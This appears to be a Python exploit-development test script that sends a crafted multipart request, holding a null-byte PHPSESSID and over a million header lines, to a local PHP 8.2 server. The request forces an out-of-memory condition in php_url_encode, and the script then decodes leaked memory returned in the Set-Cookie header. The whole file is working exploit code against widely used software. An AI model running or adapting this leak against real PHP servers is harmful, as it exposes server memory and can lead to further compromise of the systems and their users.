#!/usr/bin/env python3
"""Test the dinosn 7.2 leak arm on 8.2.34.
arm1: PHPSESSID=\x00 + N header lines (a:\n) in a file part -> OOM in php_url_encode -> send_cookie=1 -> cookie emitted.
"""
import sys, time
sys.path.insert(0, r"C:\Users\likat\p2s52704\php72")
import drive as D

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 18111
NHEADERS = int(sys.argv[2]) if len(sys.argv) > 2 else 1299780

# Reset worker first (abort via a big request)
def reset_worker():
    try:
        c = D.Conn("127.0.0.1", PORT, False)
        c.get("/")
        c.close()
    except Exception:
        pass
    time.sleep(1)

print(f"[*] Testing arm1 on port {PORT}, nheaders={NHEADERS}")
reset_worker()

body = D.arm_body(NHEADERS, b"a:\n", b"\x00")
print(f"[*] arm body size = {len(body)} bytes ({len(body)/1024/1024:.1f} MB)")

c = D.Conn("127.0.0.1", PORT, False)
r = c.post("/index.php", body, False, maxread=65536)
sc = r.get("headers", {}).get("set-cookie", "")
print(f"[*] status={r['status']} resp_len={r['total']} set_cookie_len={len(sc)}")
if sc:
    print(f"[*] Set-Cookie head: {sc[:80]!r}")
    # Decode the cookie value
    import urllib.parse
    if "PHPSESSID=" in sc:
        val = sc.split("PHPSESSID=")[1].split(";")[0]
        decoded = urllib.parse.unquote_to_bytes(val)
        print(f"[*] decoded cookie len = {len(decoded)} bytes")
        print(f"[*] decoded head = {decoded[:40]!r}")
else:
    print(f"[*] NO Set-Cookie emitted")
    print(f"[*] body head: {r['body'][:200]!r}")
c.close()
